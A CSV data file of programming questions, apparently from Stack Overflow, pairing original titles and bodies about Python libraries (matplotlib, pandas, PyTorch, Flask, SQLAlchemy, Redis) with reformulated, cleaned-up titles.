originalTitle,body,reformulatedTitle
How to change marker size/scale in matplotlib plot when marker is set to pixel," I am scatter ploting data points with a very small marker (see screengrab below). When I use the very small marker ',' the legend is very hard to read (example code taken from here).(Python 3, Jupyter lab)How can I increase the size of the marker in the legend. The two versions shown on the above mentioned site do not work: and The two solutions do however work when the marker is set to '.'.How can I show bigger makers in the legend?Sample Code from intoli.com: <code>  legend = ax.legend(frameon=True) for legend_handle in legend.legendHandles: legend_handle._legmarker.set_markersize(9) ax.legend(markerscale=6) import numpy as npimport matplotlib.pyplot as pltnp.random.seed(12)fig = plt.figure()ax = fig.add_subplot(1, 1, 1)for i in range(5): mean = [np.random.random()*10, np.random.random()*10] covariance = [ [1 + np.random.random(), np.random.random() - 1], [0, 1 + np.random.random()], ] covariance[1][0] = covariance[0][1] # must be symmetric x, y = np.random.multivariate_normal(mean, covariance, 3000).T plt.plot(x, y, ',', label=f'Cluster {i + 1}')ax.legend(markerscale=12)fig.tight_layout()plt.show()",How to change marker size/scale in legend when marker is set to pixel
how to understand Seaboarn heatmap annot format?," I am looking for a way to show ""0.0045"" as ""0.45%"" on seaboarn's heatmap by specifying the fmt keyword: However, I did not find a list of format to use. Searching between different examples, I have seen ""d"", "".2g"", "".1f"", "".1f%"". But it is not clear what is the convention we are assuming here.Is this assuming people have a common understanding of the formatting format? Or this is present on a doc page I missed? <code>  sns.heatmap(data, annot=True, fmt='??')",how to understand Seaborn's heatmap annotation format?
Why does Python allow out of range array indexes?," So I just came across what seems to me like a strange Python feature and wanted some clarification about it. The following array manipulation somewhat makes sense: I imagine it is actually just appending this value to the end, correct?Why can I do this, however? And even more so this: This just seems like wrong logic. It seems like this should throw an error! Any explanation?-Is it just a weird thing Python does?-Is there a purpose to it?-Or am I thinking about this the wrong way? <code>  p = [1,2,3]p[3:] = [4] p = [1,2,3,4] p[20:22] = [5,6]p = [1,2,3,4,5,6] p[20:100] = [7,8]p = [1,2,3,4,5,6,7,8]",Why does Python allow out-of-range slice indexes for sequences?
Python pathlib : Convert WindowsPath to PosixPath," I am using pathlib to manage my paths in my Python project using the Path class.When I am using Linux, everything works fine. But on Windows, I have a little issue.At some point in my code, I have to write a JavaScript file which lists the references to several other files. These paths have to be written in POSIX format. But when I do str(my_path_instance) on Windows, The path is written in Windows format.Do you know a simple way to convert a WindowsPath to a PosixPath with pathlib? <code> ",Convert WindowsPath to PosixPath
Pytorch: How to create an update rule the doesn't come from derivatives?," I want to implement the following algorithm, taken from this book, section 13.6:I don't understand how to implement the update rule in pytorch (the rule for w is quite similar to that of theta).As far as I know, torch requires a loss for loss.backwward().This form does not seem to apply for the quoted algorithm.I'm still certain there is a correct way of implementing such update rules in pytorch.Would greatly appreciate a code snippet of how the w weights should be updated, given that V(s,w) is the output of the neural net, parameterized by w.EDIT: Chris Holland suggested a way to implement, and I implemented it. It does not converge on Cartpole, and I wonder if I did something wrong.The critic does converge on the solution to the function gamma*f(n)=f(n)-1 which happens to be the sum of the series gamma+gamma^2+...+gamma^infmeaning, gamma=1 diverges. gamma=0.99 converges on 100, gamma=0.5 converges on 2 and so on. Regardless of the actor or policy.The code: and EDIT 2:Chris Holland's solution works. The problem originated from a bug in my code that caused the line to always get called, thus expected_reward_from_t1 was never zero, and thus no stopping condition was specified for the bellman equation recursion.With no reward engineering, gamma=1, lambda=0.6, and a single hidden layer of size 128 for both actor and critic, this converged on a rather stable optimal policy within 500 episodes.Even faster with gamma=0.99, as the graph shows (best discounted episode reward is about 86.6).BIG thank you to @Chris Holland, who ""gave this a try"" <code>  def _update_grads_with_eligibility(self, is_critic, delta, discount, ep_t): gamma = self.args.gamma if is_critic: params = list(self.critic_nn.parameters()) lamb = self.critic_lambda eligibilities = self.critic_eligibilities else: params = list(self.actor_nn.parameters()) lamb = self.actor_lambda eligibilities = self.actor_eligibilities is_episode_just_started = (ep_t == 0) if is_episode_just_started: eligibilities.clear() for i, p in enumerate(params): if not p.requires_grad: continue eligibilities.append(torch.zeros_like(p.grad, requires_grad=False)) # eligibility traces for i, p in enumerate(params): if not p.requires_grad: continue eligibilities[i][:] = (gamma * lamb * eligibilities[i]) + (discount * p.grad) p.grad[:] = delta.squeeze() * eligibilities[i] expected_reward_from_t = self.critic_nn(s_t)probs_t = self.actor_nn(s_t)expected_reward_from_t1 = torch.tensor([[0]], dtype=torch.float)if s_t1 is not None: # s_t is not a terminal state, s_t1 exists. expected_reward_from_t1 = self.critic_nn(s_t1)delta = r_t + gamma * expected_reward_from_t1.data - expected_reward_from_t.datanegative_expected_reward_from_t = -expected_reward_from_tself.critic_optimizer.zero_grad()negative_expected_reward_from_t.backward()self._update_grads_with_eligibility(is_critic=True, delta=delta, discount=discount, ep_t=ep_t)self.critic_optimizer.step() if s_t1 is not None: expected_reward_from_t1 = self.critic_nn(s_t1)",Pytorch: How to create an update rule that doesn't come from derivatives?
What is the different between Pytesseract and Tesserocr?, I'm using Python 3.6 in Windows 10 and have Pytesseract already installed but I found in a code Tesserocr which by the way I can't install. What is the difference? <code> ,What is the difference between Pytesseract and Tesserocr?
"Swagger with Flask-Restful, Api and multiple Blueprints"," I'm building a very complex microservice using Flask and Flask-Restplus. It will have many endpoints, thus I'm organizing each endpoint into a separate Blueprint.Currently, I'm struggling with the usage of Flask-Restplus and API using multiple Blueprints in combination with swaggerI want to be able to get all the endpoints of my blueprints into the built-in swagger of API, but this doesn't seem to work.I can access my endpoints via postman, but the swagger-UI doesn't show anything. :(The following example code and directory structure should give you a hint towards my idea: My main init.py looks like this: endpointa.py with the corresponding Blueprint: Again: I can access my endpoints via postman, but the swagger-UI doesn't show anything:Normally I would add endpoints to API using something like but this doesn't seem to be possible with multiple Blueprints.Can anyone show me how to add/register these Blueprints (endpointa_api, endpointb_api and endpointc_api) with Api ? <code>  . endpoints endpointa.py endpointb.py endpointc.py __init__.py __init__.py run.py from flask import Flask, Blueprint, logging, jsonify, request, Responsefrom flask_restplus import Resource, Api # create app and apiapp = Flask(__name__)api_prefix = '/api/v1/'# register Blueprintsfrom endpoints.endpointa import endpointa_apiapp.register_blueprint(endpointa_api, url_prefix=api_prefix)from endpoints.endpointb import endpointb_apiapp.register_blueprint(endpointb_api, url_prefix=api_prefix)from endpoints.endpointc import endpointc_apiapp.register_blueprint(endpointc_api, url_prefix=api_prefix)api = Api(app, version='1', title='Test Service REST-API', description='A REST-API for the Test Service, implemented in python')if __name__ == '__main__': app.run(debug=True, host=""0.0.0.0"", port=5060) from os import environimport json, ast, syslogimport requestsimport gcfrom flask import Flask, Blueprint, logging, jsonify, request, Responsefrom flask_restplus import Resource, Apiendpointa_api = Blueprint('endpointa_api', __name__)@endpointa_api.route('testa', methods=['GET'])def testa(): ...@endpointa_api.route('testa/<string:testa_id>', methods=['GET', 'POST'])def testa_id(): ... api.add_resource(TestClass, api_prefix + 'test')","SOLVED: Swagger with Flask-Restplus, API and multiple Blueprints"
"Swagger with Flask-Restful, API and multiple Blueprints"," I'm building a very complex microservice using Flask and Flask-Restplus. It will have many endpoints, thus I'm organizing each endpoint into a separate Blueprint.Currently, I'm struggling with the usage of Flask-Restplus and API using multiple Blueprints in combination with swaggerI want to be able to get all the endpoints of my blueprints into the built-in swagger of API, but this doesn't seem to work.I can access my endpoints via postman, but the swagger-UI doesn't show anything. :(The following example code and directory structure should give you a hint towards my idea: My main init.py looks like this: endpointa.py with the corresponding Blueprint: Again: I can access my endpoints via postman, but the swagger-UI doesn't show anything:Normally I would add endpoints to API using something like but this doesn't seem to be possible with multiple Blueprints.Can anyone show me how to add/register these Blueprints (endpointa_api, endpointb_api and endpointc_api) with Api ? <code>  . endpoints endpointa.py endpointb.py endpointc.py __init__.py __init__.py run.py from flask import Flask, Blueprint, logging, jsonify, request, Responsefrom flask_restplus import Resource, Api # create app and apiapp = Flask(__name__)api_prefix = '/api/v1/'# register Blueprintsfrom endpoints.endpointa import endpointa_apiapp.register_blueprint(endpointa_api, url_prefix=api_prefix)from endpoints.endpointb import endpointb_apiapp.register_blueprint(endpointb_api, url_prefix=api_prefix)from endpoints.endpointc import endpointc_apiapp.register_blueprint(endpointc_api, url_prefix=api_prefix)api = Api(app, version='1', title='Test Service REST-API', description='A REST-API for the Test Service, implemented in python')if __name__ == '__main__': app.run(debug=True, host=""0.0.0.0"", port=5060) from os import environimport json, ast, syslogimport requestsimport gcfrom flask import Flask, Blueprint, logging, jsonify, request, Responsefrom flask_restplus import Resource, Apiendpointa_api = Blueprint('endpointa_api', __name__)@endpointa_api.route('testa', methods=['GET'])def testa(): ...@endpointa_api.route('testa/<string:testa_id>', methods=['GET', 'POST'])def testa_id(): ... api.add_resource(TestClass, api_prefix + 'test')","SOLVED: Swagger with Flask-Restplus, API and multiple Blueprints"
"Swagger with Flask-Restplus, API and multiple Blueprints"," I'm building a very complex microservice using Flask and Flask-Restplus. It will have many endpoints, thus I'm organizing each endpoint into a separate Blueprint.Currently, I'm struggling with the usage of Flask-Restplus and API using multiple Blueprints in combination with swaggerI want to be able to get all the endpoints of my blueprints into the built-in swagger of API, but this doesn't seem to work.I can access my endpoints via postman, but the swagger-UI doesn't show anything. :(The following example code and directory structure should give you a hint towards my idea: My main init.py looks like this: endpointa.py with the corresponding Blueprint: Again: I can access my endpoints via postman, but the swagger-UI doesn't show anything:Normally I would add endpoints to API using something like but this doesn't seem to be possible with multiple Blueprints.Can anyone show me how to add/register these Blueprints (endpointa_api, endpointb_api and endpointc_api) with Api ? <code>  . endpoints endpointa.py endpointb.py endpointc.py __init__.py __init__.py run.py from flask import Flask, Blueprint, logging, jsonify, request, Responsefrom flask_restplus import Resource, Api # create app and apiapp = Flask(__name__)api_prefix = '/api/v1/'# register Blueprintsfrom endpoints.endpointa import endpointa_apiapp.register_blueprint(endpointa_api, url_prefix=api_prefix)from endpoints.endpointb import endpointb_apiapp.register_blueprint(endpointb_api, url_prefix=api_prefix)from endpoints.endpointc import endpointc_apiapp.register_blueprint(endpointc_api, url_prefix=api_prefix)api = Api(app, version='1', title='Test Service REST-API', description='A REST-API for the Test Service, implemented in python')if __name__ == '__main__': app.run(debug=True, host=""0.0.0.0"", port=5060) from os import environimport json, ast, syslogimport requestsimport gcfrom flask import Flask, Blueprint, logging, jsonify, request, Responsefrom flask_restplus import Resource, Apiendpointa_api = Blueprint('endpointa_api', __name__)@endpointa_api.route('testa', methods=['GET'])def testa(): ...@endpointa_api.route('testa/<string:testa_id>', methods=['GET', 'POST'])def testa_id(): ... api.add_resource(TestClass, api_prefix + 'test')","SOLVED: Swagger with Flask-Restplus, API and multiple Blueprints"
Is there a simple way to partly merge arrays in python," I want to merge two arrays in python in a special way. The entries with an odd index of my output array out shall be the coresponding entries of my first input array in0. The entries with an even index in out shall be the coresponding entries of my second input array in1.in0, in1 and out are all the same length.Example:The input arrays shall be merge to the output array Is there a nicer way than to loop over the whole length of the inputs and fill my out 'by hand'? <code>  in0 = [0, 1, 2, 3]in1 = [4, 5, 6, 7] out = [0, 5, 2, 7]",Combine elements from two lists
Access elements from a Matrix by a list of indices in Python," I know how to access elements in a vector by indices doing: which gives the correct answer : [2 4 6]But I am trying to do the same thing using a 2D matrix, something like: this should display me ""[0.0 0.9]"" for the value at (0,0) and the one at (1,1) in the matrix. But instead it displays ""[ 0.1 0.1]"". Also if I try to use 3 indices with : I now get the following error: I ultimately need to apply a simple max() operation on all the elements at these indices and need the fastest way to do that for optimization purposes.What am I doing wrong ? How can I access specific elements in a matrix to do some operation on them in a very efficient way (not using list comprehension nor a loop). <code>  test = numpy.array([1,2,3,4,5,6])indices = list([1,3,5])print(test[indices]) currentGrid = numpy.array( [[0, 0.1], [0.9, 0.9], [0.1, 0.1]])indices = list([(0,0),(1,1)])print(currentGrid[indices]) indices = list([(0,0),(1,1),(0,2)]) Traceback (most recent call last): File ""main.py"", line 43, in <module> print(currentGrid[indices])IndexError: too many indices for array","Access elements of a Matrix by a list of indices in Python to apply a max(val, 0.5) to each value without a for loop"
Access elements from a Matrix by a list of indices in Python to apply a max() to each without a for loop," I know how to access elements in a vector by indices doing: which gives the correct answer : [2 4 6]But I am trying to do the same thing using a 2D matrix, something like: this should display me ""[0.0 0.9]"" for the value at (0,0) and the one at (1,1) in the matrix. But instead it displays ""[ 0.1 0.1]"". Also if I try to use 3 indices with : I now get the following error: I ultimately need to apply a simple max() operation on all the elements at these indices and need the fastest way to do that for optimization purposes.What am I doing wrong ? How can I access specific elements in a matrix to do some operation on them in a very efficient way (not using list comprehension nor a loop). <code>  test = numpy.array([1,2,3,4,5,6])indices = list([1,3,5])print(test[indices]) currentGrid = numpy.array( [[0, 0.1], [0.9, 0.9], [0.1, 0.1]])indices = list([(0,0),(1,1)])print(currentGrid[indices]) indices = list([(0,0),(1,1),(0,2)]) Traceback (most recent call last): File ""main.py"", line 43, in <module> print(currentGrid[indices])IndexError: too many indices for array","Access elements of a Matrix by a list of indices in Python to apply a max(val, 0.5) to each value without a for loop"
Access elements of a Matrix by a list of indices in Python to apply a max() to each without a for loop," I know how to access elements in a vector by indices doing: which gives the correct answer : [2 4 6]But I am trying to do the same thing using a 2D matrix, something like: this should display me ""[0.0 0.9]"" for the value at (0,0) and the one at (1,1) in the matrix. But instead it displays ""[ 0.1 0.1]"". Also if I try to use 3 indices with : I now get the following error: I ultimately need to apply a simple max() operation on all the elements at these indices and need the fastest way to do that for optimization purposes.What am I doing wrong ? How can I access specific elements in a matrix to do some operation on them in a very efficient way (not using list comprehension nor a loop). <code>  test = numpy.array([1,2,3,4,5,6])indices = list([1,3,5])print(test[indices]) currentGrid = numpy.array( [[0, 0.1], [0.9, 0.9], [0.1, 0.1]])indices = list([(0,0),(1,1)])print(currentGrid[indices]) indices = list([(0,0),(1,1),(0,2)]) Traceback (most recent call last): File ""main.py"", line 43, in <module> print(currentGrid[indices])IndexError: too many indices for array","Access elements of a Matrix by a list of indices in Python to apply a max(val, 0.5) to each value without a for loop"
How to plot the slope/tangent of parabola at any point? (using python and matplotlib)," I want to plot a simple illustration of using derivative to find out a slope of a function at any point. It would look kinda like this:I have already plotted a simple parabola using this code: Now I want to add something like this: To draw a tangent line going through the current_weight.But I can't seem to figure this out, can you help? <code>  import numpy as npfrom matplotlib import pyplot as pltinputs = 0.2weights = np.arange(-6,14)target_prediction = 0.7prediction = inputs*weightserrors = (prediction - target_prediction) ** 2plt.xlabel(""Weight"")plt.ylabel(""Error"")plt.plot(weights, error) current_weight = 5# draw a short fraction of a line to represent slopex = np.arange(optimal_weight - 3, optimal_weight + 3)# derivativeslope = 2 * (inputs*current_weight - target_prediction)y = slope*x # How should this equation look like?plt.plot(x, y)",How to plot the slope (tangent line) of parabola at any point?
How to plot the slope/tangent of parabola at any point?," I want to plot a simple illustration of using derivative to find out a slope of a function at any point. It would look kinda like this:I have already plotted a simple parabola using this code: Now I want to add something like this: To draw a tangent line going through the current_weight.But I can't seem to figure this out, can you help? <code>  import numpy as npfrom matplotlib import pyplot as pltinputs = 0.2weights = np.arange(-6,14)target_prediction = 0.7prediction = inputs*weightserrors = (prediction - target_prediction) ** 2plt.xlabel(""Weight"")plt.ylabel(""Error"")plt.plot(weights, error) current_weight = 5# draw a short fraction of a line to represent slopex = np.arange(optimal_weight - 3, optimal_weight + 3)# derivativeslope = 2 * (inputs*current_weight - target_prediction)y = slope*x # How should this equation look like?plt.plot(x, y)",How to plot the slope (tangent line) of parabola at any point?
Python example of xadd and xread," Could you give a very simple example of using Redis' xread and xadd in Python ( that displays the type and format of return values form xread and input of xadd)? I've already read many documentation but none of them are in Python.The Redis doc gives an example: but If I try in python: I get this error: <code>  > XADD mystream * sensor-id 1234 temperature 19.81518951480106-0 sample = {b""hello"":b""12""}id = r.xadd(""mystream"", sample) redis.exceptions.ResponseError: WRONGTYPE Operation against a key holding the wrong kind of value",Redis - Python example of xadd and xread
Python: How to make alternating background color using plotly?," Using only these few lines of code from plot.ly will give you the plot below in a jupyter notebook:Snippet 1: Plot 1:How can you set it up so you can have alternating bakcground colors in the plot below like it was shown in this post using matplotlib?Here's a link that explains how to add shaded areas like this:Snippet 2: Plot 2:Thank you for any suggestions! <code>  import plotlyimport cufflinks as cffrom plotly.offline import download_plotlyjs, init_notebook_mode, plot, iplotinit_notebook_mode(connected=True)iplot(cf.datagen.lines().iplot(asFigure=True, kind='scatter',xTitle='Dates',yTitle='Returns',title='Returns')) df.iplot(vspan={'x0':'2015-02-15','x1':'2015-03-15','color':'rgba(30,30,30,0.3)','fill':True,'opacity':.4}, filename='cufflinks/custom-regions')",Python: How to make shaded areas or alternating background color using plotly?
How to run flask_migrate in docker," I have a project with the following structure: My goal is to run migrations from the application directory to create tables in the database during docker-compose. Dockerfile docker-compose.yaml How can I do that? <code>  proj src application app.py manage.py migrations Dockerfile docker-compose.yaml python manage.py db upgrade FROM python:3.7-alpineADD requirements.txt /code/WORKDIR /codeRUN apk add --no-cache postgresql-dev gcc python3 musl-dev && \ pip3 install -r requirements.txtADD . /codeEXPOSE 5000WORKDIR /code/src/applicationCMD [""flask"", ""run"", ""--host=0.0.0.0""] ---version: ""3""services: web: links: - ""db"" build: . ports: - ""5000:5000"" volumes: - .:/code depends_on: - db env_file: - .env db: image: postgres:10 restart: always environment: - POSTGRES_USER=postgres - POSTGRES_PASSWORD=postgres - POSTGRES_DB=app ports: - ""5432:5432"" expose: - 5432",How to run flask_migrate in Docker
Pandas group the rows in a dataframe based on specified column value," I have the data frame as like below one, Now I need to group the dataframe based on the column values ""gw_mac"" and ""mac"" and I should get the following three different groups <code>  Input DataFrame gw_mac mac 0 ac233fc015f6 dce83f3bc820 1 ac233fc015f6 ac233f264a4c 2 ac233fc015f6 ac233f264a4c 3 ac233fc015f6 dce83f3bc820 4 ac233fc015f6 ac233f264a4c 5 ac233fc015f6 ac233f264a4c 6 ac233fc015f6 dce83f3bc820 7 ac233fc015f6 e464eecba5eb Expected OutputGroup1 gw_mac mac 0 ac233fc015f6 dce83f3bc820 3 ac233fc015f6 dce83f3bc820 6 ac233fc015f6 dce83f3bc820Group2 gw_mac mac 1 ac233fc015f6 ac233f264a4c 2 ac233fc015f6 ac233f264a4c 4 ac233fc015f6 ac233f264a4c 5 ac233fc015f6 ac233f264a4cGroup3 gw_mac mac 7 ac233fc015f6 e464eecba5eb",Pandas group the rows in a dataframe based on specific column value
dylib cannot load libstd when compiled from a workspace in rust," I have a project with the following structure: Where:my_lib is a Rust library with crate-type = [""dylib""]my_bin is a Rust binary application using my_libmy_script.py is a Python 3 script that also uses my_libThe root Cargo.toml contains a basic workspace declaration: Everything works properly if I execute cargo build and cargo run -p my_bin. The problem comes with the Python script.In this script, I load the my_lib lib file using the following code: If I use the library file from the library directory (./my_lib/target/...), the script has no problem loading the library and executing its functions.But if I use the library file from the workspace directory (./target/...) I get the following error when trying to load the library: In the same fashion, trying to execute my_bin directly from the workspace target directory yields the same error (even though cargo run -p my_bin work flawlessly).Using the software ""Dependency Walker"", I found that the my_lib library cannot find the Rust libstd library (has the previous error message explain).Manually exporting the path that contains the Rust toolchain library into the environment PATH fixes the issue. This is however far from ideal and not portable. I also don't understand why this issue is only occurring when using the workspace target.So, why can't the workspace target find rust's libstd when each project target can? Is there a way to fix this issue that wouldn't require to find the toolchain path and modify an environment variable? <code>  Cargo.tomlmy_script.pymy_lib: - Cargo.toml - srcmy_bin: - Cargo.toml - src [workspace]members = [ ""my_lib"", ""my_bin""] from ctypes import cdllfrom sys import platformif platform == 'darwin': prefix = 'lib' ext = 'dylib'elif platform == 'win32': prefix = '' ext = 'dll'else: prefix = 'lib' ext = 'so'# Working path:# lib_path = './my_lib/target/debug/{}my_lib.{}'.format(prefix, ext)# Buggy ""Library not loaded: @rpath/libstd-d00eaa6834e55536.dylib"" path:lib_path = './target/debug/{}my_lib.{}'.format(prefix, ext)lib = cdll.LoadLibrary(lib_path)my_func = lib.my_funcmy_func() OSError: dlopen(./target/debug/libpeglrs.dylib, 6): Library not loaded: @rpath/libstd-d00eaa6834e55536.dylib",dylib cannot load libstd when compiled in a workspace
dylib cannot load Rust's libstd when compiled in a workspace," I have a project with the following structure: Where:my_lib is a Rust library with crate-type = [""dylib""]my_bin is a Rust binary application using my_libmy_script.py is a Python 3 script that also uses my_libThe root Cargo.toml contains a basic workspace declaration: Everything works properly if I execute cargo build and cargo run -p my_bin. The problem comes with the Python script.In this script, I load the my_lib lib file using the following code: If I use the library file from the library directory (./my_lib/target/...), the script has no problem loading the library and executing its functions.But if I use the library file from the workspace directory (./target/...) I get the following error when trying to load the library: In the same fashion, trying to execute my_bin directly from the workspace target directory yields the same error (even though cargo run -p my_bin work flawlessly).Using the software ""Dependency Walker"", I found that the my_lib library cannot find the Rust libstd library (has the previous error message explain).Manually exporting the path that contains the Rust toolchain library into the environment PATH fixes the issue. This is however far from ideal and not portable. I also don't understand why this issue is only occurring when using the workspace target.So, why can't the workspace target find rust's libstd when each project target can? Is there a way to fix this issue that wouldn't require to find the toolchain path and modify an environment variable? <code>  Cargo.tomlmy_script.pymy_lib: - Cargo.toml - srcmy_bin: - Cargo.toml - src [workspace]members = [ ""my_lib"", ""my_bin""] from ctypes import cdllfrom sys import platformif platform == 'darwin': prefix = 'lib' ext = 'dylib'elif platform == 'win32': prefix = '' ext = 'dll'else: prefix = 'lib' ext = 'so'# Working path:# lib_path = './my_lib/target/debug/{}my_lib.{}'.format(prefix, ext)# Buggy ""Library not loaded: @rpath/libstd-d00eaa6834e55536.dylib"" path:lib_path = './target/debug/{}my_lib.{}'.format(prefix, ext)lib = cdll.LoadLibrary(lib_path)my_func = lib.my_funcmy_func() OSError: dlopen(./target/debug/libpeglrs.dylib, 6): Library not loaded: @rpath/libstd-d00eaa6834e55536.dylib",dylib cannot load libstd when compiled in a workspace
"Maximum sum of subsequence of length L, which has a distance between elem no more K"," Given an array of positive integers. How to find a subsequence of length L with max sum which has the distance between any two of its neighboring elements that do not exceed KI have the following solution but don't know how to take into account length L. 1 <= N <= 100000, 1 <= L <= 200, 1 <= K <= Nf[i] contains max sum of the subsequence that ends in i. <code>  for i in range(K, N) f[i] = INT_MIN for j in range(1, K+1) f[i] = max(f[i], f[i-j] + a[i])return max(f)",Maximum sum of subsequence of length L with a restriction
Bulk Upset with SQLAlchemy Postgres," I'm following the SQLAlchemy documentation here to write a bulk upsert statement with Postgres. For demonstration purposes, I have a simple table MyTable: Creating a generic insert statement is simple enough: The problem I run into is when I try to add the ""on conflict"" part of the upsert. Trying to execute this statement yields a ProgrammingError: I think my misunderstanding is in constructing the statement with the on_conflict_do_update method. Does anyone know how to construct this statement? I have looked at other questions on StackOverflow (eg. here) but I can't seem to a way to address the above error. <code>  class MyTable(base): __tablename__ = 'mytable' id = Column(types.Integer, primary_key=True) test_value = Column(types.Text) from sqlalchemy.dialects import postgresqlvalues = [{'id': 0, 'test_value': 'a'}, {'id': 1, 'test_value': 'b'}]insert_stmt = postgresql.insert(MyTable.__table__).values(values) update_stmt = insert_stmt.on_conflict_do_update( index_elements=[MyTable.id], set_=dict(data=values)) from sqlalchemy import create_engineengine = create_engine('postgres://localhost/db_name')engine.execute(update_stmt)>>> ProgrammingError: (psycopg2.ProgrammingError) can't adapt type 'dict'",Bulk Upsert with SQLAlchemy Postgres
How to choose randomly between 2 values," So basically I'm trying to get a piece of code to randomly choose between two values -40 and 40. To do so, I was thinking of using good old mathematics like - random_num = ((-1)^value)*40, where value = {1, 2}. random_num, as the name suggest should be a random number.Any help ? I am using python, solution using libraries is acceptable. <code> ",How to choose randomly between two values?
Pythonic method to move up n directories," I'm looking for a pythonic way to move up n directories from a given directory.Let's say we have the example path /data/python_env/lib/python3.6/site-packages/matplotlib/mpl-data. If we were to move up n=2 directories we should end up at /data/python_env/lib/python3.6/site-packages.The following works to move up n directories: However, it's not very readable and fails for paths on windows machines. In essence, it doesn't feel a very pythonic solution.Is there a better, more pythonic solution, maybe using the os module? <code>  up_n = lambda path, n: '/'.join(path.split('/')[:-n])",How to move up n directories in Pythonic way?
Is this the approved way to get data adjacent to a Python script?," I have a Python script that needs some data that's stored in a file that will always be in the same location as the script. I have a setup.py for the script, and I want to make sure it's pip installable in a wide variety of environments, and can be turned into a standalone executable if necessary.Currently the script runs with Python 2.7 and Python 3.3 or higher (though I don't have a test environment for 3.3 so I can't be sure about that).I came up with this method to get the data. This script isn't part of a module directory with __init__.py or anything, it's just a standalone file that will work if just run with python directly, but also has an entry point defined in the setup.py file. It's all one file. Is this the correct way? This seems ridiculously complex. Also, it seems to rely on the package management system in ways I'm uncomfortable with. The script no longer works unless it's been pip-installed, and that also doesn't seem desirable. <code>  def fetch_wordlist(): wordlist = 'wordlist.txt' try: import importlib.resources as res return res.read_binary(__file__, wordlist) except ImportError: pass try: import pkg_resources as resources req = resources.Requirement.parse('makepw') wordlist = resources.resource_filename(req, wordlist) except ImportError: import os.path wordlist = os.path.join(os.path.dirname(__file__), wordlist) with open(wordlist, 'rb') as f: return f.read()",Is this the approved way to acess data adjacent to/packaged with a Python script?
TF2 dataset.__iter__() is only supported when eager execution is enabled," I'm using the following custom training code in TensorFlow 2: This code gives me the error: However, it's in TensorFlow 2.0 so eager is enabled by default.tf.executing_eagerly() also returns 'True'. <code>  def parse_function(filename, filename2): image = read_image(fn) def ret1(): return image, read_image(fn2), 0 def ret2(): return image, preprocess(image), 1 return tf.case({tf.less(tf.random.uniform([1])[0], tf.constant(0.5)): ret2}, default=ret1)dataset = tf.data.Dataset.from_tensor_slices((train,shuffled_train))dataset = dataset.shuffle(len(train))dataset = dataset.map(parse_function, num_parallel_calls=4)dataset = dataset.batch(1)dataset = dataset.prefetch(buffer_size=4)@tf.functiondef train(model, dataset, optimizer): for x1, x2, y in enumerate(dataset): with tf.GradientTape() as tape: left, right = model([x1, x2]) loss = contrastive_loss(left, right, tf.cast(y, tf.float32)) gradients = tape.gradient(loss, model.trainable_variables) optimizer.apply_gradients(zip(gradients, model.trainable_variables))siamese_net.compile(optimizer=tf.keras.optimizers.RMSprop(learning_rate=1e-3))train(siamese_net, dataset, tf.keras.optimizers.RMSprop(learning_rate=1e-3)) dataset.__iter__() is only supported when eager execution is enabled.",TensorFlow 2.0 dataset.__iter__() is only supported when eager execution is enabled
Conv1D with kernel_size=1 interpretation," I'm working on very sparse vectors as input. I started working with simple Linear (dense/fully connected layers) and my network yielded pretty good results (let's take accuracy as my metric here, 95.8%).I later tried to use a Conv1d with a kernel_size=1 and a MaxPool1d, and this network works slightly better (96.4% accuracy).Question: How are these two implementation different ? Shouldn't a Conv1d with a unit kernel_size do the same as a Linear layer?I've tried multiple runs, the CNN always yields slightly better results. <code> ",Conv1D with kernel_size=1 vs Linear layer
"How to disable a ""Reload site"" popup for (python) selenium tests in chrome?"," I am running automated (python) selenium tests on a chrome browser, and sometimes when a page is reloaded a popup appears on the screeen:Is it possible to configure the chrome selenium browser in such a way, that this popup does not appear? If so, how to do that? Or are there other ways to supress this popup? Or to accept it? <code> ","How to disable a ""Reload site? Changes you made may not be saved"" popup for (python) selenium tests in chrome?"
